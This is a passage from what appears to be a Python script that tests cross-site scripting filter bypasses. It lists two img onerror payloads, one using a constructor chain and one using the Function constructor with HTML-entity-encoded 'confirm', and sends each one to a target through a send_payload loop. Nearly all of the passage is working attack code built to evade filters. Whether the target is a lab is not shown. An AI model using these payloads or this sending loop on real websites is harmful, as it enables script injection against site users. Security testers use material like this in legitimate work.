    ("<img src=x onerror=[]{['constructor']['constructor']('confirm(1)')()}>", "constructor chain"),
    
    # Using Function constructor directly with entities
    ("<img src=x onerror=Function('&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)')()>", "Function+entity"),
]

for payload, name in novel_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

